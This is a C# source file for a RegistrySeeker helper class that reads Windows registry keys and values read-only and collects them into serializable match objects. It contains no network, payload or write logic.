namespace PEGASUS.Helper
{
    using Microsoft.Win32;
    using System;
    using System.Collections.Generic;

    /// <summary>
    /// Defines the <see cref="RegistrySeeker" />.
    /// </summary>
    public class RegistrySeeker
    {
        /// <summary>
        /// Defines the <see cref="RegSeekerMatch" />.
        /// </summary>
        [ProtoContract]
        public class RegSeekerMatch
        {
            /// <summary>
            /// Gets or sets the Key.
            /// </summary>
            [ProtoMember(1)]
            public string Key { get; set; }

            /// <summary>
            /// Gets or sets the Data.
            /// </summary>
            [ProtoMember(2)]
            public RegValueData[] Data { get; set; }

            /// <summary>
            /// Gets or sets a value indicating whether HasSubKeys.
            /// </summary>
            [ProtoMember(3)]
            public bool HasSubKeys { get; set; }

            /// <summary>
            /// The ToString.
            /// </summary>
            /// <returns>The <see cref="string"/>.</returns>
            public override string ToString()
            {
                return $"({Key}:{Data})";
            }
        }

        /// <summary>
        /// Defines the <see cref="RegValueData" />.
        /// </summary>
        [ProtoContract]
        public class RegValueData
        {
            /// <summary>
            /// Gets or sets the Name.
            /// </summary>
            [ProtoMember(1)]
            public string Name { get; set; }

            /// <summary>
            /// Gets or sets the Kind.
            /// </summary>
            [ProtoMember(2)]
            public RegistryValueKind Kind { get; set; }

            /// <summary>
            /// Gets or sets the Data.
            /// </summary>
            [ProtoMember(3)]
            public byte[] Data { get; set; }
        }

        /// <summary>
        /// Defines the _matches.
        /// </summary>
        private readonly List<RegSeekerMatch> _matches;

        /// <summary>
        /// Gets the Matches.
        /// </summary>
        public RegSeekerMatch[] Matches => _matches?.ToArray();

        /// <summary>
        /// Initializes a new instance of the <see cref="RegistrySeeker"/> class.
        /// </summary>
        public RegistrySeeker()
        {
            _matches = new List<RegSeekerMatch>();
        }

        /// <summary>
        /// The BeginSeeking.
        /// </summary>
        /// <param name="rootKeyName">The rootKeyName<see cref="string"/>.</param>
        public void BeginSeeking(string rootKeyName)
        {
            if (!string.IsNullOrEmpty(rootKeyName))
            {
                using (RegistryKey registryKey = GetRootKey(rootKeyName))
                {
                    if (registryKey != null && registryKey.Name != rootKeyName)
                    {
                        string name = rootKeyName.Substring(registryKey.Name.Length + 1);
                        using RegistryKey registryKey2 = registryKey.OpenReadonlySubKeySafe(name);
                        if (registryKey2 != null)
                        {
                            Seek(registryKey2);
                        }
                        return;
                    }
                    Seek(registryKey);
                    return;
                }
            }
            Seek(null);
        }

        /// <summary>
        /// The Seek.
        /// </summary>
        /// <param name="rootKey">The rootKey<see cref="RegistryKey"/>.</param>
        private void Seek(RegistryKey rootKey)
        {
            if (rootKey == null)
            {
                foreach (RegistryKey rootKey2 in GetRootKeys())
                {
                    ProcessKey(rootKey2, rootKey2.Name);
                }
                return;
            }
            Search(rootKey);
        }

        /// <summary>
        /// The Search.
        /// </summary>
        /// <param name="rootKey">The rootKey<see cref="RegistryKey"/>.</param>
        private void Search(RegistryKey rootKey)
        {
            string[] subKeyNames = rootKey.GetSubKeyNames();
            foreach (string text in subKeyNames)
            {
                RegistryKey key = rootKey.OpenReadonlySubKeySafe(text);
                ProcessKey(key, text);
            }
        }

        /// <summary>
        /// The ProcessKey.
        /// </summary>
        /// <param name="key">The key<see cref="RegistryKey"/>.</param>
        /// <param name="keyName">The keyName<see cref="string"/>.</param>
        private void ProcessKey(RegistryKey key, string keyName)
        {
            if (key != null)
            {
                List<RegValueData> list = new List<RegValueData>();
                string[] valueNames = key.GetValueNames();
                foreach (string name in valueNames)
                {
                    RegistryValueKind valueKind = key.GetValueKind(name);
                    object value = key.GetValue(name);
                    list.Add(RegistryKeyHelper.CreateRegValueData(name, valueKind, value));
                }
                AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(list), key.SubKeyCount);
            }
            else
            {
                AddMatch(keyName, RegistryKeyHelper.GetDefaultValues(), 0);
            }
        }

        /// <summary>
        /// The AddMatch.
        /// </summary>
        /// <param name="key">The key<see cref="string"/>.</param>
        /// <param name="values">The values<see cref="RegValueData[]"/>.</param>
        /// <param name="subkeycount">The subkeycount<see cref="int"/>.</param>
        private void AddMatch(string key, RegValueData[] values, int subkeycount)
        {
            RegSeekerMatch item = new RegSeekerMatch
            {
                Key = key,
                Data = values,
                HasSubKeys = (subkeycount > 0)
            };
            _matches.Add(item);
        }

        /// <summary>
        /// The GetRootKey.
        /// </summary>
        /// <param name="subkeyFullPath">The subkeyFullPath<see cref="string"/>.</param>
        /// <returns>The <see cref="RegistryKey"/>.</returns>
        public static RegistryKey GetRootKey(string subkeyFullPath)
        {
            string[] array = subkeyFullPath.Split('\\');
            try
            {
                return array[0] switch
                {
                    "HKEY_CLASSES_ROOT" => RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64),
                    "HKEY_CURRENT_USER" => RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64),
                    "HKEY_LOCAL_MACHINE" => RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64),
                    "HKEY_USERS" => RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64),
                    "HKEY_CURRENT_CONFIG" => RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64),
                    _ => throw new Exception("Invalid rootkey, could not be found."),
                };
            }
            catch (SystemException)
            {
                throw new Exception("Unable to open root registry key, you do not have the needed permissions.");
            }
            catch (Exception ex2)
            {
                throw ex2;
            }
        }

        /// <summary>
        /// The GetRootKeys.
        /// </summary>
        /// <returns>The <see cref="List{RegistryKey}"/>.</returns>
        public static List<RegistryKey> GetRootKeys()
        {
            List<RegistryKey> list = new List<RegistryKey>();
            try
            {
                list.Add(RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64));
                list.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64));
                list.Add(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64));
                list.Add(RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64));
                list.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64));
                return list;
            }
            catch (SystemException)
            {
                throw new Exception("Could not open root registry keys, you may not have the needed permission");
            }
            catch (Exception ex2)
            {
                throw ex2;
            }
        }
    }

    internal class ProtoMemberAttribute : Attribute
    {
        public ProtoMemberAttribute(int v)
        {
            V = v;
        }

        public int V { get; }
    }

    internal class ProtoContractAttribute : Attribute
    {
    }
}
